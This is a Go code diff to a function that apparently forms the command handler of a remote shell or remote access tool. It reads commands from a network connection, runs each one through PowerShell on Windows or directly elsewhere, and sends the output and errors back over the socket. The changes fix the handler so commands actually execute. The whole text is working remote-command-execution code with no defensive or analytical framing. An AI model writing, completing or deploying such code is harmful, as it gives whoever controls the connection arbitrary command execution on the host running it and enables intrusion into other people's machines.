@@ -13,16 +13,20 @@ import (
 
 type Command struct {
 	CmdOutput string
-	CmdErr    string
+	CmdError  string
 }
 
-func ExecCommandWindows(connection net.Conn) (err error) {
+func ExecuteCommandWindows(connection net.Conn) (err error) {
+
 	reader := bufio.NewReader(connection)
 
 	commandloop := true
 
 	for commandloop {
+		fmt.Println("loop started")
+
 		raw_user_input, err := reader.ReadString('\n')
+
 		if err != nil {
 			fmt.Println(err)
 			continue
@@ -30,13 +34,15 @@ func ExecCommandWindows(connection net.Conn) (err error) {
 		user_input := strings.TrimSuffix(raw_user_input, "\n")
 		if user_input == "stop" {
 			commandloop = false
+
 		} else {
+
 			fmt.Println("[+] User Command: ", user_input)
 
 			var cmd_instance *exec.Cmd
 
 			if runtime.GOOS == "windows" {
-				cmd_instance = exec.Command(user_input)
+				cmd_instance = exec.Command("powershell.exe", "/C", user_input)
 			} else {
 				cmd_instance = exec.Command(user_input)
 			}
@@ -47,22 +53,28 @@ func ExecCommandWindows(connection net.Conn) (err error) {
 			cmd_instance.Stdout = &output
 			cmd_instance.Stderr = &commandErr
 
+			err = cmd_instance.Run()
+			if err != nil {
+				fmt.Println(err)
+			}
+
 			cmdStruct := &Command{}
 
 			cmdStruct.CmdOutput = output.String()
-			cmdStruct.CmdErr = commandErr.String()
+			cmdStruct.CmdError = commandErr.String()
 
 			encoder := gob.NewEncoder(connection)
 
-			err := encoder.Encode(cmdStruct)
+			err = encoder.Encode(cmdStruct)
 
 			if err != nil {
 				fmt.Println(err)
 				continue
 			}
+
 		}
 
 	}
-
 	return
 }
+
